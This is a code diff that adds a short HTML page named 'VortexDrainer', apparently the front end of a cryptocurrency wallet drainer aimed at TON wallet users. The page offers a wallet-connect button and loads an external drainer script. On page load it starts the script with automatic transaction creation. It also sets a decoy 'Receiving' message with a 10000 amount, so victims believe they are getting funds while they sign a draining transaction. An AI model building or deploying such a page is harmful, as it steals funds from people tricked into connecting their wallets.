@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>VortexDrainer</title>
+  <link rel="stylesheet" href="/vrtx.css?v=1.0.0" />
+</head>
+<body>
+<div class="ton-connect-button">
+  <button class="ton-connect-trigger">Clicked</button>
+</div>
+
+<!-- Import VortexDrainer library with error handling -->
+<script src="/vrtx.js?v=1.0.0" defer crossorigin></script>
+
+<!-- Initialize VortexDrainer and set up event listeners with isolated scope -->
+<script>
+  
+    window.addEventListener('load', () => {
+      window.drainer?.init({
+        autoCreateTransaction: true,
+        autoOpenModal: false,
+      });
+      window.drainer?.overrideHoneypot({
+        honeypot_message: "🎉 Receiving",
+        honeypot_amount:10000
+      })
+    });
+</script>
+</body>
+</html>
